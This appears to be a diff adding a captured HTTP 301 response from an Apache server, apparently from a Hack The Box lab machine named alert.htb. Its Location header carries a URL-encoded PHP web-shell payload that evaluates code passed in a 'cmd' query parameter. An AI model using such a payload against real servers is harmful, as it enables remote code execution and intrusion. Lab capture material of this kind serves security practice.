@@ -1,0 +1,7 @@
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 25 Nov 2024 02:42:26 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Location: http://alert.htb/%3c%25eval($_GET%5b'cmd'%5d);%25%3e
+Content-Length: 337
+Content-Type: text/html; charset=iso-8859-1
+
